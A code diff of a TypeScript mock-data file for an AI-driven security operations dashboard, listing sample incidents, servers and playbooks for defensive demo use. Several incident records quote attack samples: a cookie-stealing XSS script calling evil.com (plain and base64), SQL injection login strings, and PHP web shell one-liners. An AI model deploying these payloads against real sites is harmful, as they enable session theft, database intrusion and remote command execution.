@@ -1,461 +1,217 @@
-import type { SystemHealth, Incident, Report, VictimServer, AlarmConfig } from '../types';
-
-// ─── System Health ─────────────────────────────────────────────────────────────
+import type { 
+  SystemHealth, 
+  Incident, 
+  VictimServer, 
+  Playbook, 
+  UserProfile, 
+  NotificationSettings 
+} from '../types';
 
 export const mockSystemHealth: SystemHealth = {
-  overallThreatScore: 78,
+  overallThreatScore: 84,
   agentRunning: true,
-  pendingActions: 2,
+  pendingActions: 3,
   components: [
-    { id: 'fastapi', name: 'AI Backend (FastAPI)', status: 'connected', latencyMs: 12 },
-    { id: 'elasticsearch', name: 'Elasticsearch', status: 'connected', latencyMs: 34 },
-    { id: 'victim1', name: 'Victim Server 1', status: 'connected', latencyMs: 8 },
-    { id: 'victim2', name: 'Victim Server 2', status: 'degraded', latencyMs: 230 },
+    { id: 'fastapi', name: 'AI Backend (FastAPI)', status: 'connected', latencyMs: 12, lastSeen: '2026-04-22T17:15:00Z' },
+    { id: 'elasticsearch', name: 'Elasticsearch', status: 'connected', latencyMs: 34, lastSeen: '2026-04-22T17:15:05Z' },
+    { id: 'victim1', name: 'Web Server (Victim)', status: 'connected', latencyMs: 8, lastSeen: '2026-04-22T17:15:10Z' },
   ],
 };
 
-// ─── Incidents ─────────────────────────────────────────────────────────────────
-
 export const mockIncidents: Incident[] = [
   {
-    id: 'INC-001',
-    title: 'SSH Brute Force 탐지',
+    id: 'INC-2024-001',
+    attack_type: 'Stored Cross-Site Scripting (XSS)',
     threatLevel: 'CRITICAL',
+    confidence_score: 0.97,
     status: 'PENDING',
-    targetIp: '192.168.10.15',
-    targetName: 'Victim Server 1',
-    detectedAt: '2026-04-17T00:02:13+09:00',
-    mitreTechnique: 'T1110.001',
-    mitreName: 'Brute Force: Password Guessing',
-    summary:
-      '외부 IP 203.0.113.42로부터 1분간 320회 SSH 로그인 실패 탐지. 관리자 계정(root) 대상 사전 대입 공격.',
-    aiThinkingLog: [
-      {
-        id: 'step1',
-        timestamp: '2026-04-17T00:02:14+09:00',
-        message: 'Elasticsearch에서 최근 5분 SSH 로그 검색 중...',
-        type: 'search',
-      },
-      {
-        id: 'step2',
-        timestamp: '2026-04-17T00:02:15+09:00',
-        message: '320건의 Failed password 이벤트 발견 (소스 IP: 203.0.113.42)',
-        type: 'analysis',
-      },
-      {
-        id: 'step3',
-        timestamp: '2026-04-17T00:02:16+09:00',
-        message: 'MITRE ATT&CK T1110.001 (Brute Force: Password Guessing) 매핑 완료',
-        type: 'analysis',
-      },
-      {
-        id: 'step4',
-        timestamp: '2026-04-17T00:02:17+09:00',
-        message: '공격 IP 203.0.113.42 차단 조치 계획 수립 완료. 관리자 승인 대기 중.',
-        type: 'decision',
-      },
+    targetIp: '192.168.1.50',
+    targetName: 'Web Server (Victim)',
+    detectedAt: '2026-04-22T17:08:00Z',
+    created_at: '2026-04-22T17:08:00Z',
+    mitre_attack_ids: ['T1059.007', 'T1190'],
+    iocs: {
+      attacker_ips: ['45.33.22.11'],
+      target_uris: ['/api/v1/comments'],
+    },
+    executive_summary: 'AI agent detected a persistent XSS attempt on the comments API. The payload contains an obfuscated script designed to steal session cookies from administrative users.',
+    detailed_analysis: '### Analysis Details\n1. **Payload Identification**: The request body contains `<script>fetch("http://evil.com/?"+document.cookie)</script>` encoded in Base64.\n2. **Database Verification**: The payload was successfully stored in the `comments` table.\n3. **Risk Assessment**: High. Any user viewing the comments section will execute this script in their browser context.',
+    key_indicators: [
+      { label: 'Payload in DB', value: true, description: 'Malicious script confirmed in database' },
+      { label: 'Administrative Context', value: true, description: 'Targeted at admin dashboard users' },
+      { label: 'Previous Attempts', value: false, description: 'No prior attempts from this IP' }
     ],
-    evidence: [
-      {
-        id: 'ev1',
-        raw: 'Apr 17 00:01:44 victim1 sshd[4521]: Failed password for root from 203.0.113.42 port 56789 ssh2',
-        source: '/var/log/auth.log',
-        timestamp: '2026-04-17T00:01:44+09:00',
-      },
-      {
-        id: 'ev2',
-        raw: 'Apr 17 00:01:45 victim1 sshd[4522]: Failed password for root from 203.0.113.42 port 56801 ssh2',
-        source: '/var/log/auth.log',
-        timestamp: '2026-04-17T00:01:45+09:00',
-      },
-    ],
-    actionPlan: [
-      {
-        id: 'act1',
-        target: '네트워크',
-        action: 'block_ip',
-        parameter: '203.0.113.42',
-        justification: '1분간 320회 SSH 실패 - 명백한 브루트포스 공격 IP',
-      },
-    ],
+    raw_log: '{"timestamp":"2026-04-22T17:08:00Z","method":"POST","path":"/api/v1/comments","body":{"content":"PHNjcmlwdD5mZXRjaCgiaHR0cDovL2V2aWwuY29tLz8iK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4="},"headers":{"x-forwarded-for":"45.33.22.11"}}',
+    recommended_actions: [
+      { id: 'rec-1', action: 'Clean Database', parameter: 'DELETE FROM comments WHERE id=402', description: 'Remove the malicious comment from the database.' },
+      { id: 'rec-2', action: 'Block IP', parameter: '45.33.22.11', description: 'Block the attacker\'s IP address at the firewall level.' }
+    ]
   },
   {
-    id: 'INC-002',
-    title: '비정상 프로세스 실행',
-    threatLevel: 'WARNING',
-    status: 'UNDER_INVESTIGATION',
-    targetIp: '192.168.10.16',
-    targetName: 'Victim Server 2',
-    detectedAt: '2026-04-16T23:45:00+09:00',
-    mitreTechnique: 'T1053.003',
-    mitreName: 'Scheduled Task/Cron',
-    summary:
-      'www-data 계정에서 /tmp/.x 경로 실행 파일 실행. 예약 작업(crontab)으로 지속성 확보 시도 탐지.',
-    aiThinkingLog: [
-      {
-        id: 'step1',
-        timestamp: '2026-04-16T23:45:05+09:00',
-        message: '프로세스 트리 분석 중 - www-data → /tmp/.x (PID: 3912)',
-        type: 'search',
-      },
-      {
-        id: 'step2',
-        timestamp: '2026-04-16T23:45:10+09:00',
-        message: 'crontab 변조 이력 확인 중...',
-        type: 'analysis',
-      },
-      {
-        id: 'step3',
-        timestamp: '2026-04-16T23:45:15+09:00',
-        message: '추가 IOC 수집 중. 분석 완료 후 조치 계획 수립 예정.',
-        type: 'analysis',
-      },
-    ],
-    evidence: [
-      {
-        id: 'ev1',
-        raw: 'Apr 16 23:44:58 victim2 CRON[3912]: (www-data) CMD (/tmp/.x &> /dev/null)',
-        source: '/var/log/syslog',
-        timestamp: '2026-04-16T23:44:58+09:00',
-      },
-    ],
-    actionPlan: [
-      {
-        id: 'act1',
-        target: '프로세스',
-        action: 'terminate_process',
-        parameter: 'PID: 3912',
-        justification: '/tmp/.x 비정상 경로의 숨겨진 실행 파일',
-      },
-    ],
-  },
-  {
-    id: 'INC-003',
-    title: '웹쉘 업로드 시도',
+    id: 'INC-2024-002',
+    attack_type: 'SQL Injection Attempt',
     threatLevel: 'CRITICAL',
+    confidence_score: 0.92,
+    status: 'PENDING',
+    targetIp: '192.168.1.50',
+    targetName: 'Web Server (Victim)',
+    detectedAt: '2026-04-22T16:45:00Z',
+    created_at: '2026-04-22T16:45:00Z',
+    mitre_attack_ids: ['T1190'],
+    iocs: {
+      attacker_ips: ['103.45.67.89'],
+      target_uris: ['/login.php'],
+    },
+    executive_summary: 'Automated SQL injection attempt detected on the login portal. The attacker is using boolean-based blind techniques to enumerate database schema.',
+    detailed_analysis: '### Analysis Details\n1. **Pattern Matching**: Multiple requests with `\' OR 1=1--` pattern found.\n2. **Frequency**: 45 requests in 10 seconds.',
+    key_indicators: [
+      { label: 'SQLi Pattern', value: true, description: 'Known SQL injection pattern detected' },
+      { label: 'High Frequency', value: true, description: 'Potential automated scanning' }
+    ],
+    raw_log: '103.45.67.89 - - [22/Apr/2026:16:45:00 +0000] "POST /login.php HTTP/1.1" 200 - "username=admin\' OR \'1\'=\'1"',
+    recommended_actions: [
+      { id: 'rec-3', action: 'Block IP', parameter: '103.45.67.89', description: 'Block attacker IP.' }
+    ]
+  },
+  {
+    id: 'INC-2024-003',
+    attack_type: 'Suspicious File Upload',
+    threatLevel: 'WARNING',
+    confidence_score: 0.75,
     status: 'RESOLVED',
-    targetIp: '192.168.10.15',
-    targetName: 'Victim Server 1',
-    detectedAt: '2026-04-16T22:10:00+09:00',
-    mitreTechnique: 'T1505.003',
-    mitreName: 'Server Software Component: Web Shell',
-    summary: '/var/www/html/shell.php 웹쉘 파일 업로드 탐지. 격리 및 프로세스 종료로 차단 완료.',
-    aiThinkingLog: [
-      {
-        id: 'step1',
-        timestamp: '2026-04-16T22:10:05+09:00',
-        message: '웹서버 액세스 로그에서 비정상 POST 요청 탐지',
-        type: 'search',
-      },
-      {
-        id: 'step2',
-        timestamp: '2026-04-16T22:10:08+09:00',
-        message: '/var/www/html/shell.php 파일 생성 확인 (PHP 웹쉘 시그니처 매칭)',
-        type: 'analysis',
-      },
-      {
-        id: 'step3',
-        timestamp: '2026-04-16T22:10:10+09:00',
-        message: '관리자 승인 접수. 파일 격리 및 PID 4012 종료 실행 중...',
-        type: 'decision',
-      },
-      {
-        id: 'step4',
-        timestamp: '2026-04-16T22:10:15+09:00',
-        message: '조치 완료. shell.php 격리됨, PID 4012 종료됨.',
-        type: 'complete',
-      },
-    ],
-    evidence: [
-      {
-        id: 'ev1',
-        raw: '203.0.113.99 - - [16/Apr/2026:22:09:58 +0900] "POST /upload.php HTTP/1.1" 200 - "<?php system($_GET[\'cmd\']); ?>"',
-        source: '/var/log/nginx/access.log',
-        timestamp: '2026-04-16T22:09:58+09:00',
-      },
-    ],
-    actionPlan: [
-      {
-        id: 'act1',
-        target: '파일',
-        action: 'quarantine_file',
-        parameter: '/var/www/html/shell.php',
-        justification: '악성 PHP 웹쉘 발견 - 원격 코드 실행 위협',
-      },
-      {
-        id: 'act2',
-        target: '프로세스',
-        action: 'terminate_process',
-        parameter: 'PID: 4012',
-        justification: '웹쉘을 통해 생성된 비정상 자식 프로세스',
-      },
-    ],
+    targetIp: '192.168.1.52',
+    targetName: 'File Server',
+    detectedAt: '2026-04-22T15:20:00Z',
+    created_at: '2026-04-22T15:20:00Z',
+    mitre_attack_ids: ['T1505.003'],
+    iocs: {
+      attacker_ips: ['172.16.0.44'],
+      target_uris: ['/uploads/profile.php'],
+    },
+    executive_summary: 'A PHP file was uploaded to a directory intended for images only. AI analysis suggests it might be a simple web shell.',
+    detailed_analysis: 'File contains `eval($_GET["cmd"])`. Successfully isolated.',
+    key_indicators: [],
+    raw_log: 'inotify_event: CREATE profile.php in /var/www/uploads',
+    recommended_actions: []
   },
   {
-    id: 'INC-004',
-    title: '의심스러운 파일 생성',
+    id: 'INC-2024-004',
+    attack_type: 'Brute Force Attack',
     threatLevel: 'WARNING',
-    status: 'CONTAINED',
-    targetIp: '192.168.10.16',
-    targetName: 'Victim Server 2',
-    detectedAt: '2026-04-16T21:30:00+09:00',
-    summary: '/etc/cron.d/ 디렉토리에 숨김 파일(.backdoor) 생성. 호스트 격리 조치 완료.',
-    aiThinkingLog: [
-      {
-        id: 'step1',
-        timestamp: '2026-04-16T21:30:05+09:00',
-        message: '파일시스템 변경 이벤트 탐지: /etc/cron.d/.backdoor',
-        type: 'search',
-      },
-      {
-        id: 'step2',
-        timestamp: '2026-04-16T21:30:10+09:00',
-        message: '파일 내용 분석 - cron 기반 리버스쉘 스크립트 확인',
-        type: 'analysis',
-      },
-      {
-        id: 'step3',
-        timestamp: '2026-04-16T21:30:12+09:00',
-        message: '호스트 격리 조치 완료.',
-        type: 'complete',
-      },
-    ],
-    evidence: [
-      {
-        id: 'ev1',
-        raw: 'inotify: CREATE /etc/cron.d/.backdoor (www-data, uid=33)',
-        source: 'auditd',
-        timestamp: '2026-04-16T21:30:02+09:00',
-      },
-    ],
-    actionPlan: [
-      {
-        id: 'act1',
-        target: '호스트',
-        action: 'isolate_host',
-        parameter: '192.168.10.16',
-        justification: '지속성 확보 스크립트 발견 - 추가 감염 방지를 위한 격리',
-      },
-    ],
+    confidence_score: 0.88,
+    status: 'RESOLVED',
+    targetIp: '192.168.1.10',
+    targetName: 'SSH Gateway',
+    detectedAt: '2026-04-22T14:10:00Z',
+    created_at: '2026-04-22T14:10:00Z',
+    mitre_attack_ids: ['T1110.001'],
+    iocs: {
+      attacker_ips: ['192.168.1.200'],
+      target_uris: ['ssh:22'],
+    },
+    executive_summary: 'Multiple failed SSH login attempts from an internal IP address.',
+    detailed_analysis: 'Over 100 failed attempts within 5 minutes using common usernames.',
+    key_indicators: [],
+    raw_log: 'Apr 22 14:10:01 gateway sshd[1234]: Failed password for root from 192.168.1.200 port 5678 ssh2',
+    recommended_actions: []
   },
   {
-    id: 'INC-005',
-    title: '관리자 정기 스크립트 실행',
-    threatLevel: 'NORMAL',
-    status: 'DISMISSED',
-    targetIp: '192.168.10.15',
-    targetName: 'Victim Server 1',
-    detectedAt: '2026-04-16T20:00:00+09:00',
-    summary: '정기 백업 스크립트 실행으로 인한 경보. 관리자 확인 후 오탐 처리됨.',
-    aiThinkingLog: [
-      {
-        id: 'step1',
-        timestamp: '2026-04-16T20:00:05+09:00',
-        message: '대용량 파일 읽기/쓰기 이벤트 탐지',
-        type: 'search',
-      },
-      {
-        id: 'step2',
-        timestamp: '2026-04-16T20:00:10+09:00',
-        message: '실행 주체: backup_user, 스크립트: /opt/backup/run.sh - 정상 패턴 확인',
-        type: 'analysis',
-      },
-    ],
-    evidence: [
-      {
-        id: 'ev1',
-        raw: 'Apr 16 20:00:00 victim1 sudo: backup_user : TTY=pts/0 ; PWD=/opt/backup ; USER=root ; COMMAND=/opt/backup/run.sh',
-        source: '/var/log/auth.log',
-        timestamp: '2026-04-16T20:00:00+09:00',
-      },
-    ],
-    actionPlan: [],
-  },
-];
-
-// ─── Reports ───────────────────────────────────────────────────────────────────
-
-export const mockReports: Report[] = [
-  {
-    id: 'RPT-001',
-    incidentId: 'INC-003',
-    title: '웹쉘 업로드 시도 처리 보고서',
+    id: 'INC-2024-005',
+    attack_type: 'Unauthorized API Access',
     threatLevel: 'CRITICAL',
-    resolvedAt: '2026-04-16T22:15:00+09:00',
-    approvedBy: 'admin@agent2.io',
-    feedbackComment: '웹쉘 파일 격리 및 프로세스 종료 승인. 업로드 취약점 패치 필요.',
-    mcpResult: 'SUCCESS',
-    timeline: [
-      {
-        id: 't1',
-        label: '위협 탐지',
-        timestamp: '2026-04-16T22:10:00+09:00',
-        detail: 'Elasticsearch 이상 탐지',
-        status: 'success',
-      },
-      {
-        id: 't2',
-        label: 'AI 분석',
-        timestamp: '2026-04-16T22:10:08+09:00',
-        detail: '웹쉘 시그니처 확인 완료',
-        status: 'success',
-      },
-      {
-        id: 't3',
-        label: '관리자 승인',
-        timestamp: '2026-04-16T22:11:00+09:00',
-        detail: 'admin@agent2.io 승인',
-        status: 'success',
-      },
-      {
-        id: 't4',
-        label: '조치 실행',
-        timestamp: '2026-04-16T22:11:05+09:00',
-        detail: 'MCP API 타격 완료',
-        status: 'success',
-      },
-      {
-        id: 't5',
-        label: '조치 확인',
-        timestamp: '2026-04-16T22:15:00+09:00',
-        detail: '파일 격리 및 프로세스 종료 성공',
-        status: 'success',
-      },
-    ],
-    executedActions: [
-      {
-        id: 'act1',
-        target: '파일',
-        action: 'quarantine_file',
-        parameter: '/var/www/html/shell.php',
-        justification: '악성 PHP 웹쉘',
-      },
-      {
-        id: 'act2',
-        target: '프로세스',
-        action: 'terminate_process',
-        parameter: 'PID: 4012',
-        justification: '웹쉘 실행 프로세스',
-      },
-    ],
-  },
-  {
-    id: 'RPT-002',
-    incidentId: 'INC-004',
-    title: '의심스러운 파일 생성 처리 보고서',
-    threatLevel: 'WARNING',
-    resolvedAt: '2026-04-16T21:45:00+09:00',
-    approvedBy: 'admin@agent2.io',
-    feedbackComment: '호스트 격리 후 추가 포렌식 수행 예정.',
-    mcpResult: 'SUCCESS',
-    timeline: [
-      {
-        id: 't1',
-        label: '위협 탐지',
-        timestamp: '2026-04-16T21:30:00+09:00',
-        detail: 'Auditd 파일시스템 이벤트',
-        status: 'success',
-      },
-      {
-        id: 't2',
-        label: 'AI 분석',
-        timestamp: '2026-04-16T21:30:10+09:00',
-        detail: 'cron 기반 백도어 확인',
-        status: 'success',
-      },
-      {
-        id: 't3',
-        label: '관리자 승인',
-        timestamp: '2026-04-16T21:32:00+09:00',
-        detail: 'admin@agent2.io 승인',
-        status: 'success',
-      },
-      {
-        id: 't4',
-        label: '조치 실행',
-        timestamp: '2026-04-16T21:32:05+09:00',
-        detail: '호스트 격리 완료',
-        status: 'success',
-      },
-      {
-        id: 't5',
-        label: '조치 확인',
-        timestamp: '2026-04-16T21:45:00+09:00',
-        detail: '네트워크 격리 성공',
-        status: 'success',
-      },
-    ],
-    executedActions: [
-      {
-        id: 'act1',
-        target: '호스트',
-        action: 'isolate_host',
-        parameter: '192.168.10.16',
-        justification: '지속성 확보 스크립트 발견',
-      },
-    ],
-  },
-  {
-    id: 'RPT-003',
-    incidentId: 'INC-005',
-    title: '관리자 스크립트 오탐 처리 보고서',
-    threatLevel: 'NORMAL',
-    resolvedAt: '2026-04-16T20:10:00+09:00',
-    approvedBy: 'admin@agent2.io',
-    feedbackComment: '정기 백업 스크립트 실행으로 오탐 처리.',
-    mcpResult: 'SUCCESS',
-    timeline: [
-      {
-        id: 't1',
-        label: '위협 탐지',
-        timestamp: '2026-04-16T20:00:00+09:00',
-        detail: '대용량 파일 I/O 이벤트',
-        status: 'info',
-      },
-      {
-        id: 't2',
-        label: 'AI 분석',
-        timestamp: '2026-04-16T20:00:10+09:00',
-        detail: '정상 백업 패턴 확인',
-        status: 'info',
-      },
-      {
-        id: 't3',
-        label: '오탐 처리',
-        timestamp: '2026-04-16T20:10:00+09:00',
-        detail: '관리자 반려 (오탐)',
-        status: 'info',
-      },
-    ],
-    executedActions: [],
-  },
+    confidence_score: 0.95,
+    status: 'PENDING',
+    targetIp: '192.168.1.50',
+    targetName: 'Web Server (Victim)',
+    detectedAt: '2026-04-22T13:00:00Z',
+    created_at: '2026-04-22T13:00:00Z',
+    mitre_attack_ids: ['T1567'],
+    iocs: {
+      attacker_ips: ['203.0.113.5'],
+      target_uris: ['/admin/config/dump'],
+    },
+    executive_summary: 'Access attempt to sensitive administrative endpoint without a valid authorization token.',
+    detailed_analysis: 'Endpoint `/admin/config/dump` is reserved for internal backup scripts.',
+    key_indicators: [],
+    raw_log: '203.0.113.5 - - [22/Apr/2026:13:00:00 +0000] "GET /admin/config/dump HTTP/1.1" 403 0',
+    recommended_actions: []
+  }
 ];
-
-// ─── Victim Servers ────────────────────────────────────────────────────────────
 
 export const mockVictimServers: VictimServer[] = [
   {
-    id: 'srv1',
-    name: 'Victim Server 1',
-    ip: '192.168.10.15',
+    id: 'srv-1',
+    name: 'Web Server (Victim)',
+    ip: '192.168.1.50',
     os: 'Linux',
-    registered: '2026-04-10T09:00:00+09:00',
+    registered: '2026-04-01T09:00:00Z',
     agentStatus: 'connected',
+    lastSeen: '2026-04-22T17:15:10Z'
   },
   {
-    id: 'srv2',
-    name: 'Victim Server 2',
-    ip: '192.168.10.16',
+    id: 'srv-2',
+    name: 'Database Server',
+    ip: '192.168.1.51',
     os: 'Linux',
-    registered: '2026-04-10T09:05:00+09:00',
-    agentStatus: 'degraded',
+    registered: '2026-04-01T09:00:00Z',
+    agentStatus: 'connected',
+    lastSeen: '2026-04-22T17:14:30Z'
   },
+  {
+    id: 'srv-3',
+    name: 'File Storage',
+    ip: '192.168.1.52',
+    os: 'Linux',
+    registered: '2026-04-05T10:00:00Z',
+    agentStatus: 'disconnected',
+    lastSeen: '2026-04-22T12:00:00Z'
+  }
 ];
 
-// ─── Alarm Config ──────────────────────────────────────────────────────────────
+export const mockPlaybooks: Playbook[] = [
+  {
+    id: 'pb-1',
+    fileName: 'XSS_Response_Guide.pdf',
+    fileType: 'PDF',
+    fileSize: 1240000,
+    uploadedAt: '2026-04-10T10:00:00Z',
+    syncStatus: 'synced'
+  },
+  {
+    id: 'pb-2',
+    fileName: 'SQLi_Mitigation_Manual.docx',
+    fileType: 'DOCX',
+    fileSize: 850000,
+    uploadedAt: '2026-04-12T14:30:00Z',
+    syncStatus: 'synced'
+  },
+  {
+    id: 'pb-3',
+    fileName: 'Internal_Security_Policy.md',
+    fileType: 'MD',
+    fileSize: 45000,
+    uploadedAt: '2026-04-20T09:15:00Z',
+    syncStatus: 'synced'
+  },
+  {
+    id: 'pb-4',
+    fileName: 'New_Ransomware_Alert.txt',
+    fileType: 'TXT',
+    fileSize: 12000,
+    uploadedAt: '2026-04-22T16:00:00Z',
+    syncStatus: 'vectorizing'
+  }
+];
 
-export const mockAlarmConfig: AlarmConfig = {
-  threatScoreThreshold: 60,
-  enablePushNotification: true,
-  alertEmail: 'admin@agent2.io',
+export const mockUserProfile: UserProfile = {
+  name: '관리자',
+  email: 'admin@ai-soc.com',
+  role: 'Admin'
 };
+
+export const mockNotificationSettings: NotificationSettings = {
+  email: 'alerts@ai-soc.com',
+  webhookUrl: 'https://hooks.slack.com/services/T0000/B0000/XXXX',
+  minSeverity: 'WARNING'
+};
+
